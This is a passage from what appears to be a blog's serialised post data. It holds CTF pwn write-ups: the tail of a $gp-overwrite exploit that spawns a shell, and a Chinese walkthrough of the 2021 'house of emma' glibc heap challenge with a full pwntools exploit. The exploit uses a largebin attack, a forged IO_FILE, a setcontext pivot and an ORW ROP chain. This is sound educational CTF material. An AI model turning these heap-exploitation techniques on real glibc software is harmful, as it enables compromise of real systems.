  </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900e0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(main_addr), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># address for main() so exit() jumps back into main()</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900f0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 0xf90100</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(main_addr - <span class=\"number\">0x80</span>), <span class=\"comment\"># offset from main() to puts_blue()</span></span><br><span class=\"line\">)</span><br><span class=\"line\">p.sendline(fake_got1)                                   <span class=\"comment\"># name (fake GOT in global)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;-12&#x27;</span>)                                      <span class=\"comment\"># offset to stored $gp</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;32912&#x27;</span>)                                    <span class=\"comment\"># least significant 2 bytes of new $gp</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GET LIBC LEAK ###</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;in your game&#x27;</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">puts_addr = <span class=\"built_in\">int</span>.from_bytes(p.recvline()[<span class=\"number\">5</span>:<span class=\"number\">8</span>], <span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;puts() = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class=\"line\">libc.address = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GP OVERWRITE 2 ###</span></span><br><span class=\"line\">fake_got2 = flat(</span><br><span class=\"line\">    <span class=\"comment\"># 0xf900c0</span></span><br><span class=\"line\">    p32(<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span>)) - <span class=\"number\">0x118c</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># &quot;/bin/sh&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900d0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900e0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(main_addr), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># address for main() so exit() jumps back into main()</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900f0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 0xf90100</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]), <span class=\"comment\"># system()</span></span><br><span class=\"line\">)</span><br><span class=\"line\">p.sendline(fake_got2)                                   <span class=\"comment\"># name (fake GOT in global)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;-12&#x27;</span>)                                      <span class=\"comment\"># offset to stored $gp</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;32912&#x27;</span>)                                    <span class=\"comment\"># least significant 2 bytes of new $gp</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n"},{"title":"湖湘杯-2021-house of emma","cover":"/img/治不开心药.png","_content":"# 湖湘杯-2021-house of emma\n\n## 前言\n\n学习`house of emma `的过程中找到了他的出处,遂体会\n\n## 静态分析\n\n因为网上的题解(应该是出题人的分享),重点在说明`house of emma` 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤\n\n当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.\n\n### main\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png)\n\n其实,刚开始看到这也只是看到,一次读入了`0x500`字节,也不知道是干啥. 在看完`menu`函数之后,才反应过来程序的一个流程. 这里的`while(1)`,让程序一直循环.\n\n包括在`menu`里,也是一直循环,所以这里没有常规的方法可以触发`exit()`.而且这里,所有的`opcode`,都是一次输入.\n\n### menu\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png)\n\n这里主要是要确认`opcode`的格式, 每个`opcode`第一个字节是选项,然后是`idx`,`add()`和`edit()`需要`size`,`edit()`还需要`content`\n\n在这里的`case 5,`给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.\n\n### add\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png)\n\n`add()`里对堆块的大小和数量,作了一定的限制.并且使用的是`calloc`,会清空堆块里的原始数据.\n\n还有在`delete()`里`free` 后没有清空指针造成的`uaf`\n\n### seccomp\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png)\n\n当然,不要忘了这题开了沙箱,专门限制了`execve `,所以只能`orw`\n## 思路分析\n\n1. 首先是泄露`libc` 和 `heap` 地址,可以直接利用`uaf` 和`show()`函数做到.\n2. 使用 `LargeBin Attack` 来在` stderr` 指针处写一个可控地址\n3. 使用 `LargeBin Attack` 在`__pointer_chk_guard` 处写一个已知地址\n4. 通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的` IO_FILE` 结构\n5. 利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 [House OF Kiwi](https://www.anquanke.com/post/id/235598) 中的 IO 调用\n6. 进入 `House_OF_Emma` 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 `Setcontext` 提供内容\n7. 利用 `Setcontext` 来执行 `ROP` 来 `ORW`\n\n## exp详解\n\n在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造`fake IO`\n\n### 泄露地址\n\n以泄露`libc`为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入`unsorted bin`.\n\n所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入`largebins`.第一次直接`show()`,即可泄露`libc`地址.而要泄露`heap`地址,要先利用`edit()`修改`fd`和`bk`,这样才能把`fd_nextsize`的内容,也就是`chunk2`的地址\n\n```python\nadd(0,0x410)\nadd(1,0x410)\nadd(2,0x420)\nadd(3,0x410)\ndelete(2)\nadd(4,0x430)\nshow(2)\nrun()\nio.recvuntil(\"Del Done\\nMalloc Done\\n\")\nlibc_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x1f30b0\nlogv(\"libc_base\",hex(libc_base))\n```\n\n\n### largebins attack\n\n以修改`stderr`为例,此时有之前`free`的`chunk2`,现在`free`掉`chunk0`.此时如果正常,前面再申请一个更大的堆块,结果就是`chunk0`,会链入`largebins`.\n\n现在,先修改`chunk2`的`bk_nextsize`,再申请大堆块,就可以往`target`里写入`chunk2`的地址.\n所以成功之后,`sterr` 就被修改为了`chunk2`\n\n把`chunk2` 和 `chunk0` 改好是为了后续的持续利用\n```python\ndelete(0)\npayload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)\nedit(2,payload)\nadd(5,0x430)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(0, 0x410)\nadd(2, 0x420)\nrun()   \n```\n\n关于`largebins attack` 的详细利用及原理,不在本文讲解,将在其他文章详细分析\n\n### 修改top chunk size\n\n这里是`exp`中的`93-102`行,这里的`chunk7` ,`size`是`0x450`. `free`掉会被`top chunk`合并.我们再次申请`0x430`大小的chunk 8.\n\n通过`uaf`留下的`chunk7`的`size` 和 指针,我们就可以修改到`top chunk`的`size`.\n\n```python\nadd(7, 0x450)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(2, 0x420)\nadd(0, 0x410)\nrun()\ndelete(7)\nadd(8, 0x430)\nedit(7,b'a' * 0x438 + p64(0x300))\nrun()\n```\n\n### fake io 及 最后的利用链\n\n总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把`top chunk`的`size`修改为了`0x300`(当然,你想改成多少,就改成多少),然后我们通过申请比这个`size`大的堆块来触发`sysmalloc`,继而触发`__malloc_assert`.\n\n触发之后,会先调用`fxprintf`.经过几层调用之后,会在`__vfprintf_internal`里有如下调用:\n\n![call ](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png)\n\n正常情况下`rbx`是`stderr`的`vatable`,这已经被我们替换为了`fake io`的对应部分.这里我们按照出题者的想法,把这替换成`_io_cookie_jumps+0x38`,这样可以调用`_io_cookie_read`.\n接着往下看:\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png)\n\n这里算是`house of emma`的起点.现在的思路是,利用`setcontext`去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的`setcontext`的参数控制都是通过`rdx`来的,所以我们现在需要控制`rdx`\n\n通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,`grep \"rdx\"`不用过多解释吧. `mov` 是赋值的,也不多说.为什么最后是`call` 呢? 因为我们现在不能控制栈,所以我们希望有`call`和`jmp` 这样的指令,可以跳转.就解释到这\n\n```python\nROPgadget --binary libc.so.6 --only \"mov|call\" |grep \"rdx\"\n```\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png)\n\n这条gadget可以利用.首先rdi已经被控制为了`fake io+0xe0`里的地址,所以这里的`rdi+8` 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用`rdx+20`里的内容.\n\n所以,最后的rdx是 `[[fake io+0xe0]+8]`,这里注意控制.然后我们控制`[rdx+0x20]`为`setcontext+61`,接着就会执行`setcontext+61`.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png)\n\n第一行就是关键代码,这里我们往`fake io`后面继续布置.将`rdx `改到`fake io`上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的`orw`的地址).如下图:\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png)\n\n然后,需要注意的是`rcx`,而且它会`push rcx`,并且在后续会`ret`.所以我们要让`rcx`的内容是`ret`指令,这个很简单,只要在`ORW`的上方布置一个`ret gadget`的地址就行了.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png)\n\n\n然后就是正常的`orw`的执行了\n\n伪造`fake io`的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.\n\n当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.\n## exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"./pwn\",\"\",0)\nlibc=ELF(\"./libc.so.6\")\nopcode=b\"\"\ndef add(idx,size):\n    global opcode\n    opcode+=p8(1)+p8(idx)+p16(size)\n\ndef delete(idx):\n    global opcode\n    opcode+=p8(2)+p8(idx)\n\ndef show(idx):\n    global opcode\n    opcode+=p8(3)+p8(idx)\n\ndef edit(idx,content):\n    global opcode\n    opcode+=p8(4)+p8(idx)+p16(len(content))+content\n    \ndef run():\n    global opcode\n    opcode += p8(5)\n    io.sendafter(\"Pls input the opcode\",opcode)\n    opcode=b\"\"\n\ndef rotate_left_64(x, n):\n    # 确保移动的位数在0-63之间\n    n = n % 64\n    # 先左移n位\n    left_shift = (x << n) & 0xffffffffffffffff\n    # 然后右移64-n位，将左移时超出的位移动回来\n    right_shift = (x >> (64 - n)) & 0xffffffffffffffff\n    # 合并两部分\n    return left_shift | right_shift\n\nscript='''\nb *$rebase(0x18B6)\nb *$rebase(0x12D7)\nb __vfprintf_internal\n'''\ngdb.attach(io,script)\n\n#---------------------------------- leak libc\nadd(0,0x410)\nadd(1,0x410)\nadd(2,0x420)\nadd(3,0x410)\ndelete(2)\nadd(4,0x430)\nshow(2)\nrun()\nio.recvuntil(\"Del Done\\nMalloc Done\\n\")\nlibc_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x1f30b0\nlogv(\"libc_base\",hex(libc_base))\npop_rdi=libc_base+0x2daa2\npop_rsi=libc_base+0x37c0a\npop_rdx_r12=libc_base+0x1066e1\npop_rax=libc_base+0x446c0\nsyscall=libc_base+0x883b6 \nstderr=libc_base+libc.sym[\"stderr\"]\nsetcontext=libc_base+libc.sym[\"setcontext\"]\nopen_addr=libc_base+libc.sym[\"open\"]\nread_addr=libc_base+libc.sym[\"read\"]\nwrite=libc_base+libc.sym[\"write\"]\n\n_IO_cookie_jumps = libc_base + 0x1f3ae0\nguard = libc_base+ 0x2cc770\n#----------------------------------leak heap\nedit(2,b'a'*0x10)\nshow(2)\nrun()\nio.recvuntil(\"a\"*0x10)\nheap_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x2ae0\nlogv(\"heap\",hex(heap_base))\n#----------------------------------largein attack stderr \ndelete(0)\npayload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)\nedit(2,payload)\nadd(5,0x430)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(0, 0x410)\nadd(2, 0x420)\nrun()   \n#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧\ndelete(2)\nadd(6,0x430)\ndelete(0)\nedit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))\nadd(7, 0x450)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(2, 0x420)\nadd(0, 0x410)\nrun()\ndelete(7)\nadd(8, 0x430)\nedit(7,b'a' * 0x438 + p64(0x300))\nrun()\n#----------------------------------写 orw\nflag = heap_base + 0x22a0 + 0x260\norw = p64(pop_rdi)+p64(flag)\norw+= p64(pop_rsi)+p64(0)\norw+= p64(pop_rax)+p64(2)\norw+= p64(syscall)\n\norw+= p64(pop_rdi)+p64(3)\norw+= p64(pop_rsi)+p64(heap_base+0x1050)\norw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)\norw+= p64(read_addr)\n\norw+= p64(pop_rdi)+p64(1)\norw+= p64(pop_rsi)+p64(heap_base+0x1050)\norw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)\norw+= p64(write)\n#----------------------------------伪造fake io\nchunk0 = heap_base + 0x22a0\ngadget = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];\nxor_key = chunk0\nfake_io = p64(0) + p64(0) # IO_read_end IO_read_base\nfake_io += p64(0) + p64(0) + p64(0) # IO_write_base IO_write_ptr IO_write_end\nfake_io += p64(0) + p64(0) # IO_buf_base IO_buf_end\nfake_io += p64(0)*8 #_IO_save_base ~ _codecvt\nfake_io += p64(heap_base) + p64(0)*2  #_lock   _offset  _codecvt\nfake_io = fake_io.ljust(0xc8,b'\\x00')\n\nfake_io += p64(_IO_cookie_jumps+0x38) #vtable 0xd8\nrdi_data = chunk0 + 0xf0\nrdx_data = chunk0 + 0xf0\n\nencrypt_gadget = rotate_left_64(gadget^xor_key,0x11)\nfake_io += p64(rdi_data) # 0xe0\nfake_io += p64(encrypt_gadget) # 0xe8\nfake_io += p64(0) + p64(rdx_data) # 0xf0,0xf8\nfake_io += p64(0)*2 + p64(setcontext + 61) #0x100,0x108,0x110\nfake_io += p64(0xdeadbeef)\nfake_io += b'a'*(0xa0 - 0x30)\n# fake_io += p64(0)*2\nfake_io += p64(chunk0+0x1a0)+p64(pop_rdi+1)\nfake_io += orw\nfake_io += p64(0xdeadbeef)\nfake_io += b'flag\\x00\\x00\\x00\\x00'\nedit(0,fake_io)\nrun()\n#---------------------------------- house of emma\nadd(9,0x4c0)\nrun()\n\nio.interactive()\n```","source":"_posts/ctf比赛复现/湖湘杯-2021-house of emma.md","raw":"---\ntitle: 湖湘杯-2021-house of emma\ntags:\n    - house of XXX\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# 湖湘杯-2021-house of emma\n\n## 前言\n\n学习`house of emma `的过程中找到了他的出处,遂体会\n\n## 静态分析\n\n因为网上的题解(应该是出题人的分享),重点在说明`house of emma` 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤\n\n当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.\n\n### main\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png)\n\n其实,刚开始看到这也只是看到,一次读入了`0x500`字节,也不知道是干啥. 在看完`menu`函数之后,才反应过来程序的一个流程. 这里的`while(1)`,让程序一直循环.\n\n包括在`menu`里,也是一直循环,所以这里没有常规的方法可以触发`exit()`.而且这里,所有的`opcode`,都是一次输入.\n\n### menu\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png)\n\n这里主要是要确认`opcode`的格式, 每个`opcode`第一个字节是选项,然后是`idx`,`add()`和`edit()`需要`size`,`edit()`还需要`content`\n\n在这里的`case 5,`给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.\n\n### add\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png)\n\n`add()`里对堆块的大小和数量,作了一定的限制.并且使用的是`calloc`,会清空堆块里的原始数据.\n\n还有在`delete()`里`free` 后没有清空指针造成的`uaf`\n\n### seccomp\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png)\n\n当然,不要忘了这题开了沙箱,专门限制了`execve `,所以只能`orw`\n## 思路分析\n\n1. 首先是泄露`libc` 和 `heap` 地址,可以直接利用`uaf` 和`show()`函数做到.\n2. 使用 `LargeBin Attack` 来在` stderr` 指针处写一个可控地址\n3. 使用 `LargeBin Attack` 在`__pointer_chk_guard` 处写一个已知地址\n4. 通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的` IO_FILE` 结构\n5. 利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 [House OF Kiwi](https://www.anquanke.com/post/id/235598) 中的 IO 调用\n6. 进入 `House_OF_Emma` 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 `Setcontext` 提供内容\n7. 利用 `Setcontext` 来执行 `ROP` 来 `ORW`\n\n## exp详解\n\n在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造`fake IO`\n\n### 泄露地址\n\n以泄露`libc`为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入`unsorted bin`.\n\n所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入`largebins`.第一次直接`show()`,即可泄露`libc`地址.而要泄露`heap`地址,要先利用`edit()`修改`fd`和`bk`,这样才能把`fd_nextsize`的内容,也就是`chunk2`的地址\n\n```python\nadd(0,0x410)\nadd(1,0x410)\nadd(2,0x420)\nadd(3,0x410)\ndelete(2)\nadd(4,0x430)\nshow(2)\nrun()\nio.recvuntil(\"Del Done\\nMalloc Done\\n\")\nlibc_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x1f30b0\nlogv(\"libc_base\",hex(libc_base))\n```\n\n\n### largebins attack\n\n以修改`stderr`为例,此时有之前`free`的`chunk2`,现在`free`掉`chunk0`.此时如果正常,前面再申请一个更大的堆块,结果就是`chunk0`,会链入`largebins`.\n\n现在,先修改`chunk2`的`bk_nextsize`,再申请大堆块,就可以往`target`里写入`chunk2`的地址.\n所以成功之后,`sterr` 就被修改为了`chunk2`\n\n把`chunk2` 和 `chunk0` 改好是为了后续的持续利用\n```python\ndelete(0)\npayload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)\nedit(2,payload)\nadd(5,0x430)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(0, 0x410)\nadd(2, 0x420)\nrun()   \n```\n\n关于`largebins attack` 的详细利用及原理,不在本文讲解,将在其他文章详细分析\n\n### 修改top chunk size\n\n这里是`exp`中的`93-102`行,这里的`chunk7` ,`size`是`0x450`. `free`掉会被`top chunk`合并.我们再次申请`0x430`大小的chunk 8.\n\n通过`uaf`留下的`chunk7`的`size` 和 指针,我们就可以修改到`top chunk`的`size`.\n\n```python\nadd(7, 0x450)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(2, 0x420)\nadd(0, 0x410)\nrun()\ndelete(7)\nadd(8, 0x430)\nedit(7,b'a' * 0x438 + p64(0x300))\nrun()\n```\n\n### fake io 及 最后的利用链\n\n总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把`top chunk`的`size`修改为了`0x300`(当然,你想改成多少,就改成多少),然后我们通过申请比这个`size`大的堆块来触发`sysmalloc`,继而触发`__malloc_assert`.\n\n触发之后,会先调用`fxprintf`.经过几层调用之后,会在`__vfprintf_internal`里有如下调用:\n\n![call ](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png)\n\n正常情况下`rbx`是`stderr`的`vatable`,这已经被我们替换为了`fake io`的对应部分.这里我们按照出题者的想法,把这替换成`_io_cookie_jumps+0x38`,这样可以调用`_io_cookie_read`.\n接着往下看:\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png)\n\n这里算是`house of emma`的起点.现在的思路是,利用`setcontext`去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的`setcontext`的参数控制都是通过`rdx`来的,所以我们现在需要控制`rdx`\n\n通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,`grep \"rdx\"`不用过多解释吧. `mov` 是赋值的,也不多说.为什么最后是`call` 呢? 因为我们现在不能控制栈,所以我们希望有`call`和`jmp` 这样的指令,可以跳转.就解释到这\n\n```python\nROPgadget --binary libc.so.6 --only \"mov|call\" |grep \"rdx\"\n```\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png)\n\n这条gadget可以利用.首先rdi已经被控制为了`fake io+0xe0`里的地址,所以这里的`rdi+8` 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用`rdx+20`里的内容.\n\n所以,最后的rdx是 `[[fake io+0xe0]+8]`,这里注意控制.然后我们控制`[rdx+0x20]`为`setcontext+61`,接着就会执行`setcontext+61`.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png)\n\n第一行就是关键代码,这里我们往`fake io`后面继续布置.将`rdx `改到`fake io`上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的`orw`的地址).如下图:\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png)\n\n然后,需要注意的是`rcx`,而且它会`push rcx`,并且在后续会`ret`.所以我们要让`rcx`的内容是`ret`指令,这个很简单,只要在`ORW`的上方布置一个`ret gadget`的地址就行了.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png)\n\n\n然后就是正常的`orw`的执行了\n\n伪造`fake io`的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.\n\n当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.\n## exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"./pwn\",\"\",0)\nlibc=ELF(\"./libc.so.6\")\nopcode=b\"\"\ndef add(idx,size):\n    global opcode\n    opcode+=p8(1)+p8(idx)+p16(size)\n\ndef delete(idx):\n    global opcode\n    opcode+=p8(2)+p8(idx)\n\ndef show(idx):\n    global opcode\n    opcode+=p8(3)+p8(idx)\n\ndef edit(idx,content):\n    global opcode\n    opcode+=p8(4)+p8(idx)+p16(len(content))+content\n    \ndef run():\n    global opcode\n    opcode += p8(5)\n    io.sendafter(\"Pls input the opcode\",opcode)\n    opcode=b\"\"\n\ndef rotate_left_64(x, n):\n    # 确保移动的位数在0-63之间\n    n = n % 64\n    # 先左移n位\n    left_shift = (x << n) & 0xffffffffffffffff\n    # 然后右移64-n位，将左移时超出的位移动回来\n    right_shift = (x >> (64 - n)) & 0xffffffffffffffff\n    # 合并两部分\n    return left_shift | right_shift\n\nscript='''\nb *$rebase(0x18B6)\nb *$rebase(0x12D7)\nb __vfprintf_internal\n'''\ngdb.attach(io,script)\n\n#---------------------------------- leak libc\nadd(0,0x410)\nadd(1,0x410)\nadd(2,0x420)\nadd(3,0x410)\ndelete(2)\nadd(4,0x430)\nshow(2)\nrun()\nio.recvuntil(\"Del Done\\nMalloc Done\\n\")\nlibc_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x1f30b0\nlogv(\"libc_base\",hex(libc_base))\npop_rdi=libc_base+0x2daa2\npop_rsi=libc_base+0x37c0a\npop_rdx_r12=libc_base+0x1066e1\npop_rax=libc_base+0x446c0\nsyscall=libc_base+0x883b6 \nstderr=libc_base+libc.sym[\"stderr\"]\nsetcontext=libc_base+libc.sym[\"setcontext\"]\nopen_addr=libc_base+libc.sym[\"open\"]\nread_addr=libc_base+libc.sym[\"read\"]\nwrite=libc_base+libc.sym[\"write\"]\n\n_IO_cookie_jumps = libc_base + 0x1f3ae0\nguard = libc_base+ 0x2cc770\n#----------------------------------leak heap\nedit(2,b'a'*0x10)\nshow(2)\nrun()\nio.recvuntil(\"a\"*0x10)\nheap_base=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x2ae0\nlogv(\"heap\",hex(heap_base))\n#----------------------------------largein attack stderr \ndelete(0)\npayload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)\nedit(2,payload)\nadd(5,0x430)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(0, 0x410)\nadd(2, 0x420)\nrun()   \n#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧\ndelete(2)\nadd(6,0x430)\ndelete(0)\nedit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))\nadd(7, 0x450)\nedit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)\nedit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)\nadd(2, 0x420)\nadd(0, 0x410)\nrun()\ndelete(7)\nadd(8, 0x430)\nedit(7,b'a' * 0x438 + p64(0x300))\nrun()\n#----------------------------------写 orw\nflag = heap_base + 0x22a0 + 0x260\norw = p64(pop_rdi)+p64(flag)\norw+= p64(pop_rsi)+p64(0)\norw+= p64(pop_rax)+p64(2)\norw+= p64(syscall)\n\norw+= p64(pop_rdi)+p64(3)\norw+= p64(pop_rsi)+p64(heap_base+0x1050)\norw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)\norw+= p64(read_addr)\n\norw+= p64(pop_rdi)+p64(1)\norw+= p64(pop_rsi)+p64(heap_base+0x1050)\norw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)\norw+= p64(write)\n#----------------------------------伪造fake io\nchunk0 = heap_base + 0x22a0\ngadget = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];\nxor_key = chunk0\nfake_io = p64(0) + p64(0) # IO_read_end IO_read_base\nfake_io += p64(0) + p64(0) + p64(0) # IO_write_base IO_write_ptr IO_write_end\nfake_io += p64(0) + p64(0) # IO_buf_base IO_buf_end\nfake_io += p64(0)*8 #_IO_save_base ~ _codecvt\nfake_io += p64(heap_base) + p64(0)*2  #_lock   _offset  _codecvt\nfake_io = 